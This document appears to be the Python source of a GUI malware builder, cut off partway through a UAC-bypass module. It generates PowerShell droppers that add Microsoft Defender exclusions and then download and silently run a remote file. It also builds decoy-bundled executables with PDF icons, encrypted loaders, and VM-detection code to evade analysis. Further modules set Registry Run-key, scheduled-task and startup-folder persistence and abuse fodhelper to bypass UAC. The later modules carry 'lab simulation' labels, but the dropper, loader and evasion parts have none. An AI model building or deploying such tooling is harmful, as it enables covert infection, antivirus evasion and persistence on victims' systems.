import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import textwrap
import tempfile
import sys
import subprocess
import shutil
import base64
import hashlib
import threading

# =============================================================================
# SHARED RESOURCES & TEMPLATES
# =============================================================================

# 1. VM Detection Function (Shared across all modules)
VM_CHECK_CODE = textwrap.dedent("""\
import subprocess
import os
import platform
import sys

def is_running_on_vmware_windows():
    if platform.system() != "Windows":
        return False
    try:
        import winreg
    except Exception:
        return False
        
    # --- Check 1: WMI Artifacts (System/Hardware Names) ---
    try:
        command = 'wmic csproduct get Vendor,Name /value'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
        output = result.stdout.strip().lower()
        
        vm_indicators = ["vmware", "virtualbox", "virtual machine", "qemu", "hyper-v"]
        
        for indicator in vm_indicators:
            if indicator in output:
                return True
    except:
        pass
        
    # --- Check 2: VMware Tools Registry Key ---
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\VMware, Inc.\\VMware Tools"):
            return True
    except FileNotFoundError:
        pass
    except:
        pass

    # --- Check 3: Process List Artifacts ---
    try:
        vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "vmacthlp.exe", "vmsrvc.exe"]
        command = 'tasklist /nh' 
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
        output = result.stdout.strip().lower()

        for process in vm_processes:
            if process in output:
                return True
    except:
        pass
        
    # --- Check 4: File System Artifacts (VM Tools Directory) ---
    vmware_tools_path = r"C:\\Program Files\\VMware\\VMware Tools"
    if os.path.exists(vmware_tools_path):
        return True

    return False
""")

# 2. PowerShell Script Template (For Tab 1)
PS_TEMPLATE = textwrap.dedent("""\
# Parameters derived from configuration:
$URL = '{URL}'
$DIR = '{DOWNLOAD_PATH}'
$PAYLOAD_NAME = '{FILENAME}'
$DELAY_START = {DELAY_START}
$DELAY_WAIT = {DELAY_WAIT}
$DOWNLOAD_DIR = [System.IO.Path]::Combine($env:USERPROFILE,$DIR)

Write-Host "Executing initial delay of $DELAY_START seconds..."
Start-Sleep -Seconds $DELAY_START

if (-not (Test-Path $DOWNLOAD_DIR)) {{
    New-Item -Path $DOWNLOAD_DIR -ItemType Directory | Out-Null
    Write-Host "Created directory: $DOWNLOAD_DIR"
}}

$FinalFilePath = Join-Path $DOWNLOAD_DIR $PAYLOAD_NAME
Add-MpPreference -ExclusionPath $FinalFilePath

Write-Host "Downloading content from $URL to $FinalFilePath"
Invoke-WebRequest -Uri $URL -OutFile $FinalFilePath

Write-Host "Waiting for $DELAY_WAIT seconds after download..."
Start-Sleep -Seconds $DELAY_WAIT

Write-Host "Starting final process: $FinalFilePath"
Start-Process -FilePath $FinalFilePath -NoNewWindow
""")

# 3. PowerShell Executor Function (For Tab 1)
PS_EXEC_FUNCTION = textwrap.dedent("""\
def execute_powershell_script(ps_content):
    # Local imports ensure the function has everything it needs
    import base64
    import subprocess

    try:
        # 1. Encode the payload
        ps_script_bytes = ps_content.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')
        
        # 2. Construct command (Using list format is safer than shell=True)
        cmd = [
            "powershell.exe", 
            "-ExecutionPolicy", "Bypass", 
            "-NoProfile", 
            "-WindowStyle", "Hidden", 
            "-EncodedCommand", ps_b64
        ]

        # 3. Execute
        # 0x08000000 is the raw value for CREATE_NO_WINDOW (hides the console)
        subprocess.run(cmd, timeout=600, creationflags=0x08000000)
        return True

    except Exception:
        return False
""")

# =============================================================================
# LOGGING UTILITY
# =============================================================================

class IORedirector:
    """Redirects stdout/stderr to a specific Tkinter Text widget."""
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, s):
        def _append():
            self.text_widget.insert(tk.END, s)
            self.text_widget.see(tk.END)

        try:
            if threading.current_thread() is threading.main_thread():
                _append()
            else:
                self.text_widget.after(0, _append)
        except:
            pass # Widget might be destroyed

    def flush(self):
        pass


def _ui_notify(log_widget, level, title, message):
    notifier = messagebox.showerror if level == "error" else messagebox.showinfo

    def _show():
        notifier(title, message)

    try:
        if threading.current_thread() is threading.main_thread():
            _show()
        else:
            log_widget.after(0, _show)
    except Exception:
        pass

# =============================================================================
# BUILDER LOGIC CLASSES
# =============================================================================

class LogicConfigGen:
    @staticmethod
    def generate(url, download_path, filename, delay_start, delay_wait, enable_vm, output_exe, log_widget):
        # Redirect output
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        
        print("[INFO] Generating PowerShell Config Dropper...")

        # Format PS Content
        ps_content = PS_TEMPLATE.format(
            URL=url, DOWNLOAD_PATH=download_path, FILENAME=filename,
            DELAY_START=delay_start, DELAY_WAIT=delay_wait
        )

        # Logic Construction
        # We prepare the logic block, but we DON'T indent it here yet.
        if enable_vm:
            core_logic = textwrap.dedent(f"""\
if is_running_on_vmware_windows():
    sys.exit(0)
else:
    execute_powershell_script(PS_SCRIPT_CONTENT)
""")
        else:
            core_logic = textwrap.dedent(f"""\
execute_powershell_script(PS_SCRIPT_CONTENT)
""")

        # Assemble Full Script
        # CRITICAL FIX: We use textwrap.indent() to push core_logic 8 spaces to the right
        # so it aligns correctly under 'if platform.system() == "Windows":'
        full_script = textwrap.dedent(f"""
{VM_CHECK_CODE}
{PS_EXEC_FUNCTION}

# --- TEMPLATE VARIABLES ---
PS_SCRIPT_CONTENT = {ps_content!r}

if __name__ == "__main__":
    if platform.system() == "Windows":
{textwrap.indent(core_logic, "        ")}
    else:
        sys.exit(0)
""")

        # Compilation
        temp_dir = tempfile.mkdtemp()
        temp_py_file = os.path.join(temp_dir, "temp_runner.py")
        output_dir = os.path.dirname(output_exe)
        exe_name = os.path.basename(output_exe)
        exe_basename = os.path.splitext(exe_name)[0]

        try:
            with open(temp_py_file, 'w', encoding='utf-8') as f:
                f.write(full_script)

            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', exe_basename,
                '--distpath', output_dir, temp_py_file
            ]
            
            print(f"[INFO] Running PyInstaller... Output: {output_exe}")
            
            # Using text=True so we can read stderr if it fails
            process = subprocess.run(cmd, capture_output=True, text=True) 
            
            if process.returncode == 0:
                print(f"[SUCCESS] Executable created: {output_exe}")
                _ui_notify(log_widget, "info", "Success", f"Executable created at:\n{output_exe}")
            else:
                # Print the actual error from PyInstaller
                print(f"[ERROR] PyInstaller Failed:\n{process.stderr[-1000:]}")
                _ui_notify(log_widget, "error", "Error", "Compilation failed.\nCheck log for details.")
            
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            # Cleanup local build artifacts
            spec_file = exe_basename + '.spec'
            if os.path.exists(spec_file):
                os.remove(spec_file)
            if os.path.exists('build'):
                shutil.rmtree('build')
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr

class LogicSFX:
    @staticmethod
    def create_executor(payload_name, decoy_name, temp_dir, enable_vm):
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""

        script_content = f'''
import os
import subprocess
import tempfile
import sys
import shutil
import time
import platform

{vm_code}

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def execute_payload():
{vm_call}

    DECOY_NAME = {decoy_name!r}
    PAYLOAD_NAME = {payload_name!r}
    _staging_dir = None

    try:
        _staging_dir = tempfile.mkdtemp(prefix='fudmal_')

        bundled_decoy_path = get_resource_path(DECOY_NAME)
        bundled_payload_path = get_resource_path(PAYLOAD_NAME)

        decoy_path_out = os.path.join(_staging_dir, DECOY_NAME)
        payload_path_out = os.path.join(_staging_dir, PAYLOAD_NAME)

        shutil.copy2(bundled_decoy_path, decoy_path_out)
        shutil.copy2(bundled_payload_path, payload_path_out)
        
        # Execute the payload silently
        if sys.platform.startswith('win'):
            subprocess.Popen([payload_path_out], creationflags=subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen([payload_path_out])

        # Open the decoy file to distract the user
        if sys.platform.startswith('win'):
            os.startfile(decoy_path_out)
        elif sys.platform.startswith('linux'):
            subprocess.Popen(['xdg-open', decoy_path_out])
        else:
            subprocess.Popen(['open', decoy_path_out])

        # Wait for the viewer to open the file before cleaning up
        time.sleep(5)
            
    except Exception as e:
        pass # Fail silently
        
    finally:
        if _staging_dir:
            try:
                shutil.rmtree(_staging_dir, ignore_errors=True)
            except Exception:
                pass

if __name__ == '__main__':
    execute_payload()
'''
        path = os.path.join(temp_dir, "payload_executor.py")
        with open(path, 'w') as f: f.write(script_content)
        return path

    @staticmethod
    def build(payload_path, decoy_path, output_name, output_dir, enable_vm, log_widget, is_pdf_mode=False):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        
        print(f"[INFO] Starting {'PDF ' if is_pdf_mode else ''}SFX Build...")

        temp_dir = tempfile.mkdtemp()
        try:
            payload_name = os.path.basename(payload_path)
            decoy_name = os.path.basename(decoy_path)
            
            # Icon Handling
            icon_path = os.path.join(temp_dir, "app_icon.ico")
            include_icon = False
            if is_pdf_mode:
                # Expecting pdf.ico in CWD
                local_ico = os.path.join(os.getcwd(), "pdf.ico")
                if not os.path.exists(local_ico):
                    print("[ERROR] pdf.ico not found in current directory!")
                    _ui_notify(log_widget, "error", "Error", "pdf.ico missing.")
                    return
                shutil.copy2(local_ico, icon_path)
                include_icon = True
            else:
                # Generate from decoy image
                try:
                    from PIL import Image
                    img = Image.open(decoy_path)
                    img.save(icon_path, format="ICO", sizes=[(32,32), (64,64), (256,256)])
                    include_icon = True
                except Exception as e:
                    print(f"[WARN] Could not generate icon from decoy. Error: {e}")
            
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name = os.path.splitext(final_name)[0]
            
            # Generate Executor
            script_path = LogicSFX.create_executor(payload_name, decoy_name, temp_dir, enable_vm)
            
            # Copy files
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            shutil.copy2(decoy_path, os.path.join(temp_dir, decoy_name))
            
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                "pyinstaller", "--onefile", "--windowed",
                f"--name={base_name}",
                f"--add-data", f"{payload_name}{sep}.",
                f"--add-data", f"{decoy_name}{sep}.",
                script_path
            ]
            if include_icon:
                cmd.insert(3, f"--icon={icon_path}")
            
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            
            # Move Result
            dist_exe = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            
            print(f"[SUCCESS] Dropper created: {final_dest}")
            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")

        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr

class LogicObfuscator:
    @staticmethod
    def encode_bytes(data: bytes, version_key: str) -> bytes:
        hash_object = hashlib.sha256(version_key.encode('utf-8'))
        hash_bytes = hash_object.digest()
        key_values = [b % 64 for b in hash_bytes[:8]]
        
        byte_values = list(data)
        pipe = len(key_values)
        num_iterations = pipe
        master_sign = 1 # encode
        
        for i in range(num_iterations):
            next_byte_values = []
            internal_sign = (-1) ** i
            for j in range(len(byte_values)):
                current_byte = byte_values[j]
                key_index = (j + i) % pipe
                shift = key_values[key_index] * internal_sign * master_sign
                next_byte_values.append((current_byte + shift) % 256)
            byte_values = next_byte_values
        return bytes(byte_values)

    @staticmethod
    def build(exe_path, version_key, output_name, output_dir, enable_vm, log_widget):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)

        print("[INFO] Starting Obfuscation Build...")

        final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"

        try:
            with open(exe_path, 'rb') as f:
                raw_data = f.read()
            
            print(f"[INFO] Encrypting {len(raw_data)} bytes...")
            enc_data = LogicObfuscator.encode_bytes(raw_data, version_key)
            b64_payload = base64.b64encode(enc_data).decode('utf-8')
            
            vm_code = VM_CHECK_CODE if enable_vm else ""
            vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""
            _winreg_import = ", winreg" if enable_vm else ""

            loader_code = textwrap.dedent(f"""
import os, sys, subprocess, tempfile, hashlib, base64, platform{_winreg_import}
{vm_code}

def generate_key_values(version_key):
    hash_object = hashlib.sha256(version_key.encode('utf-8'))
    hash_bytes = hash_object.digest()
    return [b % 64 for b in hash_bytes[:8]]

def _process_bytes(data: bytes, processing_values: list, mode: str) -> bytes:
    byte_values = list(data)
    pipe = len(processing_values)
    master_sign = 1 if mode == 'encode' else -1
    for i in range(pipe):
        next_vals = []
        internal_sign = (-1) ** i
        for j in range(len(byte_values)):
            curr = byte_values[j]
            k_idx = (j + i) % pipe
            shift = processing_values[k_idx] * internal_sign * master_sign
            next_vals.append((curr + shift) % 256)
        byte_values = next_vals
    return bytes(byte_values)

def decode_bytes(data, key):
    kv = generate_key_values(key)
    return _process_bytes(data, kv, 'decode')

KEY = {version_key!r}
PAYLOAD = {b64_payload!r}

def run():
{vm_call}
    try:
        enc = base64.b64decode(PAYLOAD)
        orig = decode_bytes(enc, KEY)
        temp_dir = tempfile.gettempdir()
        t_path = os.path.join(temp_dir, 'run_' + str(os.getpid()) + '.exe')
        with open(t_path, 'wb') as f: f.write(orig)
        subprocess.Popen([t_path] + sys.argv[1:])
    except: pass

if __name__ == "__main__":
    run()
""")
            temp_loader = os.path.join(os.getcwd(), "temp_loader.py")
            with open(temp_loader, 'w', encoding='utf-8') as f:
                f.write(loader_code)

            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', os.path.splitext(final_name)[0],
                '--distpath', output_dir, temp_loader
            ]
            
            print("[INFO] Compiling Loader...")
            subprocess.run(cmd, check=True, capture_output=True)
            
            print(f"[SUCCESS] Encrypted Loader created at {os.path.join(output_dir, final_name)}")
            _ui_notify(log_widget, "info", "Success", "Obfuscation Complete.")
            
        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            if os.path.exists("temp_loader.py"):
                os.remove("temp_loader.py")
            if os.path.exists("build"):
                shutil.rmtree("build")
            spec = os.path.splitext(final_name)[0] + '.spec'
            if os.path.exists(spec):
                os.remove(spec)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr

# =============================================================================
# SIMULATION CLASSES  (added below LogicObfuscator)
# =============================================================================

class LogicRegistryPersistence:
    """Simulates MITRE ATT&CK T1547.001 – Registry Run Keys.

    Generates a compiled exe that, when run in the lab:
      1. Stages the bundled payload to %APPDATA%\\SimLab\\
      2. Writes HKCU\\...\\CurrentVersion\\Run pointing to it
      3. Displays a detailed simulation report popup
      4. Optionally removes the key (cleanup mode)
    """

    @staticmethod
    def build(payload_path, key_name, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting Registry Persistence Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1547.001 - Registry Run Keys")

        payload_name = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: remove Run key ---
    _reg_c = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _reg_c, 0, winreg.KEY_WRITE) as _hk:
            winreg.DeleteValue(_hk, REG_VALUE_NAME)
        lines.append("[CLEANUP] Run key '" + REG_VALUE_NAME + "' deleted.")
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )

        script_content = f"""import os, sys, shutil, tempfile, platform
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = {payload_name!r}
REG_VALUE_NAME   = {key_name!r}

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1547.001 Run Key", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    import winreg
    lines = [
        "[SIM] Registry Run Key Persistence Simulator",
        "[SIM] Technique: MITRE ATT&CK T1547.001",
        "-" * 60,
    ]
    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
    os.makedirs(dest_dir, exist_ok=True)
    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
        lines.append("[STEP 1] Payload staged: " + dest_payload)
    except Exception as _e:
        lines.append("[ERROR] Stage failed: " + str(_e))
        dest_payload = _res(PAYLOAD_FILENAME)
    _reg = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _reg, 0, winreg.KEY_WRITE) as _hk:
            winreg.SetValueEx(_hk, REG_VALUE_NAME, 0, winreg.REG_SZ, dest_payload)
        lines.append("[STEP 2] Registry Run key set:")
        lines.append("  HKCU\\\\" + _reg + "\\\\" + REG_VALUE_NAME)
        lines.append("  Value: " + dest_payload)
        lines.append("[NOTE] Payload executes at next user logon.")
    except Exception as _e:
        lines.append("[ERROR] Registry write failed: " + str(_e))
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "reg_persist_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr


class LogicScheduledTask:
    """Simulates MITRE ATT&CK T1053.005 – Scheduled Task/Job.

    Generates a compiled exe that, when run in the lab:
      1. Stages the bundled payload to %APPDATA%\\SimLab\\
      2. Creates a scheduled task via 'schtasks /Create' (ONLOGON or DAILY)
      3. Displays a detailed simulation report popup
      4. Optionally deletes the task (cleanup mode)
    """

    @staticmethod
    def build(payload_path, task_name, trigger, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting Scheduled Task Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1053.005 - Scheduled Task/Job")

        payload_name  = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: delete the scheduled task ---
    try:
        _del = subprocess.run(
            ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"],
            capture_output=True, text=True,
        )
        if _del.returncode == 0:
            lines.append("[CLEANUP] Task '" + TASK_NAME + "' deleted.")
        else:
            lines.append("[CLEANUP ERROR] " + _del.stderr.strip())
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )
        trigger_upper = trigger.upper()

        script_content = f"""import os, sys, shutil, tempfile, platform, subprocess
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = {payload_name!r}
TASK_NAME        = {task_name!r}
TRIGGER          = {trigger_upper!r}

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1053.005 Scheduled Task", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    lines = [
        "[SIM] Scheduled Task Persistence Simulator",
        "[SIM] Technique: MITRE ATT&CK T1053.005",
        "-" * 60,
    ]
    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
    os.makedirs(dest_dir, exist_ok=True)
    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
        lines.append("[STEP 1] Payload staged: " + dest_payload)
    except Exception as _e:
        lines.append("[ERROR] Stage failed: " + str(_e))
        dest_payload = _res(PAYLOAD_FILENAME)
    if TRIGGER == "ONLOGON":
        _cmd = ["schtasks", "/Create", "/TN", TASK_NAME,
                "/TR", dest_payload, "/SC", "ONLOGON", "/F"]
    else:
        _cmd = ["schtasks", "/Create", "/TN", TASK_NAME,
                "/TR", dest_payload, "/SC", "DAILY", "/ST", "09:00", "/F"]
    try:
        _r = subprocess.run(_cmd, capture_output=True, text=True)
        if _r.returncode == 0:
            lines.append("[STEP 2] Scheduled task created:")
            lines.append("  Name:    " + TASK_NAME)
            lines.append("  Trigger: /SC " + TRIGGER)
            lines.append("  Command: " + dest_payload)
            lines.append("[NOTE] Task executes payload per the defined schedule.")
        else:
            lines.append("[ERROR] schtasks failed: " + _r.stderr.strip())
    except Exception as _e:
        lines.append("[ERROR] " + str(_e))
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "schtask_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr


class LogicStartupFolder:
    """Simulates MITRE ATT&CK T1547.001 via the Windows Startup Folder.

    Generates a compiled exe that, when run in the lab:
      1. Resolves the current-user Startup folder path
      2. Copies the bundled payload into that folder
      3. Displays a detailed simulation report popup
      4. Optionally removes the file (cleanup mode)
    """

    @staticmethod
    def build(payload_path, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting Startup Folder Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1547.001 - Startup Folder")

        payload_name = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: remove payload from Startup folder ---
    _dest_c = os.path.join(startup_dir, PAYLOAD_FILENAME)
    try:
        if os.path.exists(_dest_c):
            os.remove(_dest_c)
        lines.append("[CLEANUP] Removed: " + _dest_c)
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )

        script_content = f"""import os, sys, shutil, tempfile, platform
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = {payload_name!r}

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1547.001 Startup Folder", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    lines = [
        "[SIM] Startup Folder Persistence Simulator",
        "[SIM] Technique: MITRE ATT&CK T1547.001 (Startup Folder)",
        "-" * 60,
    ]
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
    )
    lines.append("[STEP 1] Startup folder: " + startup_dir)
    dest_path = os.path.join(startup_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_path)
        lines.append("[STEP 2] Payload copied to startup folder:")
        lines.append("         " + dest_path)
        lines.append("[NOTE] Payload executes automatically at next user logon.")
    except Exception as _e:
        lines.append("[ERROR] Copy failed: " + str(_e))
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "startup_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr


class LogicUACBypass:
    """Simulates MITRE ATT&CK T1548.002 – Bypass UAC via fodhelper registry hijack.

    Generates a compiled exe that, when run in the lab:
      1. Writes the payload path into HKCU\\...\\ms-settings\\shell\\open\\command
      2. Launches fodhelper.exe, which reads the hijacked handler and would
         execute the payload with high-integrity (simulated – actually just
         reports what would happen)
      3. Displays a detailed simulation report popup
      4. Optionally removes the registry key (cleanup mode)
    """

    @staticmethod
    def build(payload_path, output_name, output_dir,
              enable_vm, enable_cleanup, log_widget):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting UAC Bypass Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1548.002 - Bypass UAC via fodhelper")

        payload_name = os.path.basename(payload_path)
        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        cleanup = (
            """\
    # --- CLEANUP: remove the hijacked handler key ---
    import winreg as _wr
    try:
        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _UAC_DELEGATE_KEY)
        lines.append("[CLEANUP] DelegateExecute subkey removed.")
    except FileNotFoundError:
        lines.append("[CLEANUP] DelegateExecute subkey already absent.")
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] DelegateExecute removal failed: " + str(_exc))
    try:
        with _wr.OpenKey(_wr.HKEY_CURRENT_USER, _UAC_REG_KEY, 0, _wr.KEY_WRITE) as _hk:
            try:
                _wr.DeleteValue(_hk, "")
            except FileNotFoundError:
                pass
        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _UAC_REG_KEY)
        lines.append("[CLEANUP] Hijacked handler key removed.")
    except FileNotFoundError:
        lines.append("[CLEANUP] Hijacked handler key already absent.")
    except Exception as _exc:
        lines.append("[CLEANUP ERROR] " + str(_exc))
"""
            if enable_cleanup else ""
        )

        script_content = f"""import os, sys, shutil, tempfile, platform, subprocess
import tkinter as tk
from tkinter import messagebox
{vm_code}
PAYLOAD_FILENAME = {payload_name!r}

# Registry key used by the fodhelper UAC bypass technique
_UAC_REG_KEY       = r"Software\\Classes\\ms-settings\\shell\\open\\command"
